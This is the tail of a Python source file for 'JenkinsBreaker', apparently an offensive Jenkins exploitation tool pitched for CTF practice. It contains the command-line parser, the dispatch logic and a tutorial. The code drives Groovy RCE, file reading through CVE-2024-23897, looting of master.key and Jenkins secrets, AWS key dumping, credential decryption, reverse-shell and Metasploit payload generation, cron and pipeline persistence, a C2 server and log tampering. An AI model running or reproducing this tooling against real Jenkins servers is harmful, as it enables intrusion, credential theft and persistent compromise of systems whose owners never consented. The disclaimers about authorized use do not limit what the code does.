    if command not in command_help:
        console.print(f"[red][!] Command '{command}' not found. Use --help-commands to list all commands.[/red]")
        return

    info = command_help[command]
    console.print(Panel(f"[bold cyan]Help for {command}[/bold cyan]", border_style="cyan"))
    console.print(f"[bold yellow]Description:[/bold yellow] {info['description']}")
    console.print(f"[bold yellow]Required:[/bold yellow] {info['required']}")
    console.print(f"[bold yellow]Example:[/bold yellow] {info['example']}")
    console.print(f"[bold yellow]Notes:[/bold yellow] {info['notes']}")
    console.print()

def display_tutorial():
    """Display a beginner's tutorial for using JenkinsBreaker."""
    tutorial = """
    # JenkinsBreaker Tutorial for Beginners

    Welcome to JenkinsBreaker, a tool designed for Capture The Flag (CTF) challenges to explore Jenkins vulnerabilities. This tutorial will guide you through the basics.

    ## Step 1: Prerequisites
    - **Python 3.8+**: Ensure Python is installed (`python3 --version`).
    - **Dependencies**: The script auto-installs required packages (requests, rich, etc.) in a virtual environment.
    - **Netcat**: For reverse shells (`nc -nlvp <port>`).
    - **CTF Environment**: Use only in authorized environments (e.g., HackTheBox).

    ## Step 2: Running the Script
    1. Save the script as `jenkinsbreaker.py`.
    2. Run with a basic command:
       ```bash
       python3 jenkinsbreaker.py --url http://jenkins:8080 --enumerate
       ```
       This checks the Jenkins version, plugins, and jobs.

    ## Step 3: Test Groovy RCE
    - **CVE-2019-1003029**:
       ```bash
       python3 JenkinsBreaker.py --url http://jenkins:8080 --action test_groovy_rce
       ```

    - **Test for RCE**:
       ```bash
       python3 jenkinsbreaker.py --url http://jenkins:8080 --check-groovy-rce
       ```

    - **Generate a Reverse Shell**:
       ```bash
       python3 jenkinsbreaker.py --generate-shell bash --lhost 192.168.1.100 --lport 4444
       ```
       In another terminal, start a listener:
       ```bash
       nc -nlvp 4444
       ```

    - **Exploit a CVE**:
       ```bash
       python3 jenkinsbreaker.py --url http://jenkins:8080 --exploit-cve --target-file /var/lib/jenkins/config.xml
       ```

    ## Step 4: Save Results
    - Export a report:
       ```bash
       python3 jenkinsbreaker.py --url http://jenkins:8080 --save-report report.json --format json
       ```

    ## Tips
    - Use `--help-commands` to see all options.
    - Run `--help-command <command>` for detailed help (e.g., `--help-command --enumerate`).
    - Always start with `--enumerate` to gather information.
    - Check the `jenkinsbreaker.log` file for detailed logs.

    ## Resources
    - Jenkins Documentation: https://www.jenkins.io/doc/
    - CTF Guides: HackTheBox
    - Ethical Hacking: Use only in authorized environments.

    Happy hacking!
    """
    console.print(Panel(Markdown(tutorial), title="[bold cyan]JenkinsBreaker Tutorial[/bold cyan]", border_style="cyan"))

def parse_headers(header_str):
    """Parse headers from string format Key1:Value1,Key2:Value2."""
    headers = {}
    if header_str:
        for pair in header_str.split(','):
            try:
                key, value = pair.split(':')
                headers[key.strip()] = value.strip()
            except ValueError:
                console.print(f"[red][!] Invalid header format: {pair}[/red]")
    return headers

def main():
    parser = argparse.ArgumentParser(
        description="[bold cyan]JenkinsBreaker: A tool for exploring Jenkins vulnerabilities in CTF challenges.[/bold cyan]\n"
                    "Designed for educational purposes, this tool helps students learn about Jenkins security.\n"
                    "[yellow]Use only in authorized environments (e.g., HackTheBox, TryHackMe).[/yellow]",
        epilog="[bold yellow]Examples:[/bold yellow]\n"
               "  - Enumerate Jenkins: [cyan]python3 jenkinsbreaker.py --url http://jenkins:8080 --enumerate[/cyan]\n"
               "  - Test Groovy RCE: [cyan]python3 jenkinsbreaker.py --url http://jenkins:8080 --check-groovy-rce[/cyan]\n"
               "  - Generate Shell: [cyan]python3 jenkinsbreaker.py --generate-shell bash --lhost 192.168.1.100 --lport 4444[/cyan]\n"
               "  - Run Auto Exploit: [cyan]python3 jenkinsbreaker.py --url http://jenkins:8080 --auto --lhost 192.168.1.100 --lport 4444[/cyan]\n"
               "  - View Tutorial: [cyan]python3 jenkinsbreaker.py --tutorial[/cyan]\n"
               "[yellow]Tip: Use --help-commands or --help-command <command> for more details.[/yellow]",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    # Connection Options
    conn_group = parser.add_argument_group("[bold cyan]Connection Options[/bold cyan]")
    conn_group.add_argument("--url", help="Jenkins base URL (e.g., http://jenkins:8080)")
    conn_group.add_argument("--username", help="Jenkins username for authentication")
    conn_group.add_argument("--password", help="Jenkins password or API token")
    conn_group.add_argument("--target", action='append', help="Target as URL,USER,PASS (e.g., 'http://jenkins:8080,admin,pass')")
    conn_group.add_argument("--headers", type=str, help="Custom headers (e.g., Key1:Value1,Key2:Value2)")
    conn_group.add_argument("--proxy", type=str, help="Proxy URL (e.g., http://127.0.0.1:8080)")
    conn_group.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds (e.g., 1)")

    # Reconnaissance Options
    recon_group = parser.add_argument_group("[bold cyan]Reconnaissance Options[/bold cyan]")
    recon_group.add_argument("--enumerate", action="store_true", help="Enumerate version, plugins, jobs, and vulnerabilities")
    recon_group.add_argument("--list-plugins", action="store_true", help="List installed plugins and check vulnerabilities")
    recon_group.add_argument("--list-jobs", action="store_true", help="List jobs and check pipeline vulnerabilities")
    recon_group.add_argument("--check-websocket-cli", action="store_true", help="Probe WebSocket CLI vulnerabilities")
    recon_group.add_argument("--detect-ssrf", action="store_true", help="Detect SSRF in SCM configurations")
    recon_group.add_argument("--detect-misconfigs", action="store_true", help="Detect misconfigured settings")
    recon_group.add_argument("--detect-jwt", action="store_true", help="Detect JWT tokens in console logs")
    recon_group.add_argument("--scan-secrets", action="store_true", help="Scan for secrets in configs and logs")
    recon_group.add_argument("--scan-ports", action="store_true", help="Scan common ports on the Jenkins server")
    recon_group.add_argument("--list-agents", action="store_true", help="Retrieve agent configurations (CVE-2025-31720)")
    recon_group.add_argument("--agent-secrets", action="store_true", help="Retrieve secrets from agents (CVE-2025-31721)")

    # Exploitation Options
    exploit_group = parser.add_argument_group("[bold cyan]Exploitation Options[/bold cyan]")
    exploit_group.add_argument("--fuzz-plugin", nargs=3, metavar=("PLUGIN", "ENDPOINT", "PARAMS"), help="Fuzz a plugin (e.g., 'scriptler run param1,param2')")
    exploit_group.add_argument("--dump-aws-keys", action="store_true", help="Dump AWS keys from credentials")
    exploit_group.add_argument("--tamper-logs", action="store_true", help="Simulate log tampering")
    exploit_group.add_argument("--get-crumb", action="store_true", help="Retrieve CSRF crumb")
    exploit_group.add_argument("--traversal", nargs=2, metavar=("ENDPOINT", "FILE"), help="Check file traversal vulnerability")
    exploit_group.add_argument("--check-groovy-rce", action="store_true", help="Test Groovy RCE (CVE-2019-1003029/1003030)")
    exploit_group.add_argument("--groovy-payload", type=str, help="Custom Groovy RCE payload")
    exploit_group.add_argument("--cli-trick", metavar="FILE", help="Test CLI trick for file reading")
    exploit_group.add_argument("--exploit-cve", action="store_true", help="Exploit CVE-2024-23897 for file reading")
    exploit_group.add_argument("--target-file", type=str, help="File path to read with CVE-2024-23897")
    exploit_group.add_argument("--auto", action="store_true", help="Run auto-exploit mode")
    exploit_group.add_argument("--loot-keys", action="store_true", help="Loot master.key and hudson.util.Secret")
    exploit_group.add_argument("--exploit-templating-engine", action="store_true", help="Exploit Templating Engine (CVE-2025-31722)")
    exploit_group.add_argument("--analyze-jwt", help="Crack JWT token using a wordlist")
    exploit_group.add_argument("--wordlist", default="rockyou.txt", help="Wordlist for JWT cracking")
    exploit_group.add_argument("--manual-exploit", action="store_true", help="Guide through manual reverse shell exploit")

    # Payload Generation Options
    payload_group = parser.add_argument_group("[bold cyan]Payload Generation Options[/bold cyan]")
    payload_group.add_argument("--generate-shell", choices=['python', 'groovy', 'bash', 'powershell'], help="Generate reverse shell")
    payload_group.add_argument("--generate-metasploit", action="store_true", help="Generate Metasploit payload")
    payload_group.add_argument("--meterpreter", action="store_true", help="Use Meterpreter payload for reverse shell")
    payload_group.add_argument("--lhost", help="Listener host for reverse shell")
    payload_group.add_argument("--lport", help="Listener port for reverse shell")
    payload_group.add_argument("--dns-domain", help="DNS domain for egress channel")
    payload_group.add_argument("--http-port", type=int, default=8080, help="HTTP port for payloads (default: 8080)")


    # Persistence and Evasion Options
    persist_group = parser.add_argument_group("[bold cyan]Persistence and Evasion Options[/bold cyan]")
    persist_group.add_argument("--persistence-method", choices=["cron", "jenkins_pipeline"], help="Add persistence")
    persist_group.add_argument("--c2-host", default="localhost", help="Host for C2 server")
    persist_group.add_argument("--c2-port", type=int, default=8000, help="Port for C2 server")
    persist_group.add_argument("--interactive-shell-host", default="localhost", help="Host for interactive shell WebSocket")
    persist_group.add_argument("--interactive-shell-port", type=int, default=8765, help="Port for interactive shell WebSocket")
    persist_group.add_argument("--start-c2", action="store_true", help="Explicitly start the C2 server for reverse shells or callbacks.")


    # Decryption and Reporting Options
    decrypt_group = parser.add_argument_group("[bold cyan]Decryption and Reporting Options[/bold cyan]")
    decrypt_group.add_argument("--decrypt", help="Decrypt a base64-encoded Jenkins secret")
    decrypt_group.add_argument("--decrypt-file", help="Decrypt secrets from a credentials XML file")
    decrypt_group.add_argument("--master-key-file", help="Path to master.key file")
    decrypt_group.add_argument("--hudson-secret-file", help="Path to hudson.util.Secret file")
    decrypt_group.add_argument("--save-report", type=str, help="Export findings to a report")
    decrypt_group.add_argument("--format", choices=["json", "md", "pdf"], default="json", help="Report format")
    decrypt_group.add_argument("--save-history", type=str, help="Export command history")
    decrypt_group.add_argument("--history-format", choices=["markdown", "bash"], default="markdown", help="History format")
    decrypt_group.add_argument("--generate-test-files", action="store_true", help="Generate test master.key, config.xml, hudson.util.Secret")

    # Help and Tutorial Options
    help_group = parser.add_argument_group("[bold cyan]Help and Tutorial Options[/bold cyan]")
    help_group.add_argument("--help-commands", action="store_true", help="List all available commands")
    help_group.add_argument("--help-command", help="Show detailed help for a specific command")
    help_group.add_argument("--tutorial", action="store_true", help="Display a beginner's tutorial")

    # Advanced Options
    advanced_group = parser.add_argument_group("[bold cyan]Advanced Options[/bold cyan]")
    advanced_group.add_argument("--multithreaded", action="store_true", help="Enable multithreaded exploit execution")

    # Subparser for 'run' command
    subparsers = parser.add_subparsers(dest="command")
    run_parser = subparsers.add_parser("run", help="Run a specific CVE exploit")
    run_parser.add_argument("cve", help="CVE to exploit (e.g., CVE-2024-23897)")
    run_parser.add_argument("--url", required=True, help="Jenkins base URL")
    run_parser.add_argument("--username", help="Jenkins username")
    run_parser.add_argument("--password", help="Jenkins password or API token")
    run_parser.add_argument("--lhost", help="Listener host for reverse shell")
    run_parser.add_argument("--lport", help="Listener port for reverse shell")
    run_parser.add_argument("--dns-domain", help="DNS domain for egress channel")
    run_parser.add_argument("--headers", type=str, help="Custom headers")
    run_parser.add_argument("--proxy", type=str, help="Proxy URL")
    run_parser.add_argument("--delay", type=float, default=0, help="Delay between requests")

    args = parser.parse_args()

    # Handle Help and Tutorial Commands
    if args.help_commands:
        display_commands()
        return

    if args.help_command:
        display_command_help(args.help_command)
        return

    if args.tutorial:
        display_tutorial()
        return

    headers = parse_headers(args.headers)
    proxy = args.proxy
    delay = args.delay

    # Handle Targets
    targets = []
    if args.target:
        for t in args.target:
            parts = t.split(',', 2)
            url = parts[0]
            username = parts[1] if len(parts) > 1 else None
            password = parts[2] if len(parts) > 2 else None
            targets.append((url, username, password))
    elif args.url:
        targets.append((args.url, args.username, args.password))
    elif args.command != "run" and not args.generate_test_files and not any([args.help_commands, args.help_command, args.tutorial]):
        console.print("[red][!] At least one --target or --url is required unless using --generate-test-files, --help-commands, --help-command, or --tutorial.[/red]")
        console.print("[yellow]Try: python3 jenkinsbreaker.py --help or python3 jenkinsbreaker.py --tutorial[/yellow]")
        return

    # Validate Single-Target Actions
    single_target_actions = ['decrypt', 'decrypt_file', 'save_report', 'save_history']
    if len(targets) > 1 and any(getattr(args, action) for action in single_target_actions):
        console.print("[red][!] Actions like --decrypt, --decrypt-file, --save-report, and --save-history require a single target.[/red]")
        console.print("[yellow]Use --url or a single --target.[/yellow]")
        return

    # Handle General Actions
    if args.generate_shell:
        if not (args.lhost and args.lport):
            console.print("[red][-] --generate-shell requires --lhost and --lport[/red]")
            console.print("[yellow]Example: python3 jenkinsbreaker.py --generate-shell bash --lhost 192.168.1.100 --lport 4444[/yellow]")
            return
        if args.generate_shell in ['bash', 'python', 'powershell']:
            shell = JenkinsBreaker.generate_reverse_shell(args.lhost, args.lport, lang=args.generate_shell)
        elif args.generate_shell == 'groovy':
            shell = JenkinsBreaker.generate_groovy_shell(args.lhost, args.lport, use_dns=args.dns_domain is not None, dns_domain=args.dns_domain)
        console.print(shell)

    if args.generate_metasploit:
        if not (args.lhost and args.lport):
            console.print("[red][-] --generate-metasploit requires --lhost and --lport[/red]")
            console.print("[yellow]Example: python3 jenkinsbreaker.py --generate-metasploit --lhost 192.168.1.100 --lport 4444[/yellow]")
            return
        JenkinsBreaker.generate_metasploit_payload(args.lhost, args.lport)

    if args.generate_test_files:
        tool = JenkinsBreaker("", headers=headers, proxy=proxy, delay=delay)
        tool.generate_test_files()

    if args.command == "run":
        if not args.url:
            console.print("[red][!] --url is required for 'run' command.[/red]")
            console.print("[yellow]Example: python3 jenkinsbreaker.py run CVE-2024-23897 --url http://jenkins:8080[/yellow]")
            return
        tool = JenkinsBreaker(args.url, args.username, args.password, headers=headers, proxy=proxy, delay=delay)
        if args.cve in tool.exploit_registry:
            console.print(f"[yellow][*] Running exploit for {args.cve}...[/yellow]")
            auth = (args.username, args.password) if args.username else None
            result = tool.exploit_registry[args.cve](tool, lhost=args.lhost, lport=args.lport, auth=auth, headers=headers, proxies=proxy, delay=delay)
            tool.exploits_attempted.append(result)
            console.print(f"[green][+] Exploit {args.cve} completed: {result['status']} - {result['details']}[/green]")
            tool.command_history.append({"command": f"run {args.cve}", "timestamp": datetime.now().isoformat()})
        else:
            console.print(f"[red][!] Exploit for {args.cve} not found.[/red]")
            console.print("[yellow]Check the exploits/ directory or use --help-commands.[/yellow]")
        return

    # Handle Target-Specific Actions
    for url, username, password in targets:
        auth = (username, password) if username else None
        if args.loot_keys:
            master_key, hudson_secret = loot_jenkins_keys(url, auth=auth, headers=headers, proxies=proxy, delay=delay)
            if master_key and hudson_secret:
                tool = JenkinsBreaker(url, username, password, master_key=master_key, hudson_secret=hudson_secret, headers=headers, proxy=proxy, delay=delay)
            else:
                console.print("[red][-] Failed to loot keys, please provide --master-key-file and --hudson-secret-file[/red]")
                console.print("[yellow]Example: python3 jenkinsbreaker.py --url http://jenkins:8080 --loot-keys --master-key-file master.key --hudson-secret-file hudson.util.Secret[/yellow]")
                continue
        else:
            tool = JenkinsBreaker(url, username, password, master_key_file=args.master_key_file, hudson_secret_file=args.hudson_secret_file, headers=headers, proxy=proxy, delay=delay)
        if args.enumerate:
            console.print(f"[yellow][*] Running enumeration for target: {url}[/yellow]")
            tool.enumerate_version()
            continue  # Skip further processing for this target	
        if args.fuzz_plugin:
            plugin, endpoint, params = args.fuzz_plugin
            tool.fuzz_plugin(plugin, endpoint, params.split(','))
            tool.command_history.append({"command": "fuzz_plugin", "timestamp": datetime.now().isoformat()})

        if args.dump_aws_keys:
            tool.dump_aws_keys()
            tool.command_history.append({"command": "dump_aws_keys", "timestamp": datetime.now().isoformat()})

        if args.tamper_logs:
            tool.tamper_logs()
            tool.command_history.append({"command": "tamper_logs", "timestamp": datetime.now().isoformat()})

        if args.auto:
            if not (args.lhost and args.lport):
                console.print("[red][-] --auto requires --lhost and --lport[/red]")
                console.print("[yellow]Example: python3 jenkinsbreaker.py --url http://jenkins:8080 --auto --lhost 192.168.1.100 --lport 4444[/yellow]")
                continue
            console.print(f"[yellow][*] Running auto-exploit mode for {url}...[/yellow]")
            tool.enumerate_version()
            auto_own_sandbox_bypass(url, args.lhost, args.lport, auth=auth, http_port=args.http_port, vulnerabilities=tool.vulnerabilities, multithreaded=args.multithreaded, headers=headers, proxies=proxy, delay=delay, use_dns=args.dns_domain is not None, dns_domain=args.dns_domain, use_meterpreter=args.meterpreter)
            tool.command_history.append({"command": "auto", "timestamp": datetime.now().isoformat()})

        elif args.get_crumb:
            console.print(f"[green][+] Crumb for {url}: {tool.get_csrf_crumb()}[/green]")
            tool.command_history.append({"command": "get_csrf_crumb", "timestamp": datetime.now().isoformat()})

        elif args.traversal:
            tool.check_file_traversal(*args.traversal)
            tool.command_history.append({"command": "check_file_traversal", "timestamp": datetime.now().isoformat()})

        elif args.decrypt:
            console.print(f"[green][+] Decrypted: {tool.decrypt_secret(args.decrypt)}[/green]")
            tool.command_history.append({"command": "decrypt_secret", "timestamp": datetime.now().isoformat()})

        elif args.decrypt_file:
            tool.decrypt_credentials_file(args.decrypt_file)
            tool.command_history.append({"command": "decrypt_credentials_file", "timestamp": datetime.now().isoformat()})

        elif args.check_groovy_rce:
            crumb_manager = CrumbManager(url, auth=auth)
            result = tool.test_groovy_rce(payload=args.groovy_payload, crumb_manager=crumb_manager)
            tool.exploits_attempted.append({"exploit": "test_groovy_rce", "status": "success" if result else "failed", "details": "Payload sent" if result else "Failed"})
            tool.command_history.append({"command": "test_groovy_rce", "timestamp": datetime.now().isoformat()})

        elif args.cli_trick:
            cli_read_trick(url, args.cli_trick, auth=auth, headers=headers, proxies=proxy, delay=delay)
            tool.command_history.append({"command": "cli_read_trick", "timestamp": datetime.now().isoformat()})

        elif args.exploit_cve:
            if not args.target_file:
                console.print("[red][-] --exploit-cve requires --target-file[/red]")
                console.print("[yellow]Example: python3 jenkinsbreaker.py --url http://jenkins:8080 --exploit-cve --target-file /var/lib/jenkins/config.xml[/yellow]")
                continue
            result = exploit_cve_2024_23897(url, args.target_file, auth=auth, headers=headers, proxies=proxy, delay=delay)
            if result:
                try:
                    console.print(f"[green][+] File content from {url}:\n{result.decode('utf-8')[:300]}...[/green]")
                    tool.exploits_attempted.append({"exploit": "exploit_cve_2024_23897", "status": "success", "details": "File read successfully"})
                except UnicodeDecodeError:
                    console.print(f"[green][+] File content (binary, first 300 bytes) from {url}:\n{result[:300]}...[/green]")
                    tool.exploits_attempted.append({"exploit": "exploit_cve_2024_23897", "status": "success", "details": "Binary file read"})
            else:
                tool.exploits_attempted.append({"exploit": "exploit_cve_2024_23897", "status": "failed", "details": "File read failed"})
            tool.command_history.append({"command": "exploit_cve_2024_23897", "timestamp": datetime.now().isoformat()})

        elif args.loot_keys:
            master_key, hudson_secret = loot_jenkins_keys(url, auth=auth, headers=headers, proxies=proxy, delay=delay)
            if master_key and hudson_secret:
                console.print(f"[green][+] Successfully looted keys from {url}.[/green]")
            tool.command_history.append({"command": "loot_jenkins_keys", "timestamp": datetime.now().isoformat()})

        elif args.list_agents:
            tool.retrieve_all_agent_configs()
            tool.command_history.append({"command": "retrieve_all_agent_configs", "timestamp": datetime.now().isoformat()})

        elif args.agent_secrets:
            tool.retrieve_agent_secrets()
            tool.command_history.append({"command": "retrieve_agent_secrets", "timestamp": datetime.now().isoformat()})

        elif args.exploit_templating_engine:
            if not (args.lhost and args.lport):
                console.print("[red][-] --exploit-templating-engine requires --lhost and --lport[/red]")
                console.print("[yellow]Example: python3 jenkinsbreaker.py --url http://jenkins:8080 --exploit-templating-engine --lhost 192.168.1.100 --lport 4444[/yellow]")
                continue
            crumb_manager = CrumbManager(url, auth=auth)
            tool.exploit_templating_engine(args.lhost, args.lport, crumb_manager=crumb_manager)
            tool.command_history.append({"command": "exploit_templating_engine", "timestamp": datetime.now().isoformat()})

        elif args.analyze_jwt:
            tool.analyze_jwt(args.analyze_jwt, args.wordlist)
            tool.command_history.append({"command": "analyze_jwt", "timestamp": datetime.now().isoformat()})

        elif args.persistence_method:
            tool.add_persistence(method=args.persistence_method)
            tool.command_history.append({"command": "add_persistence", "timestamp": datetime.now().isoformat()})

        elif args.manual_exploit:
            if not (args.lhost and args.lport):
                console.print("[red][-] --manual-exploit requires --lhost and --lport[/red]")
                console.print("[yellow]Example: python3 jenkinsbreaker.py --url http://jenkins:8080 --manual-exploit --lhost 192.168.1.100 --lport 4444[/yellow]")
                continue
            tool.manual_reverse_shell_exploit(args.lhost, args.lport)
            tool.command_history.append({"command": "manual_reverse_shell_exploit", "timestamp": datetime.now().isoformat()})

        # Handle server actions for the last target
        if args.start_c2:
    	     tool.start_c2_server(host=args.c2_host, port=args.c2_port)
    	     tool.command_history.append({"command": "start_c2_server", "timestamp": datetime.now().isoformat()})


        if args.interactive_shell_host and args.interactive_shell_port:
            tool.start_interactive_shell(host=args.interactive_shell_host, port=args.interactive_shell_port)
            tool.command_history.append({"command": "start_interactive_shell", "timestamp": datetime.now().isoformat()})

        elif not any(vars(args).values()) and url:
            console.print(f"[yellow][*] No specific action provided for {url}. Running version enumeration...[/yellow]")
            tool.enumerate_version()

    # Handle case with no targets and no general actions
    if not targets and not (args.generate_shell or args.generate_metasploit or args.generate_test_files or args.help_commands or args.help_command or args.tutorial):
        parser.print_help()

if __name__ == "__main__":
    main()
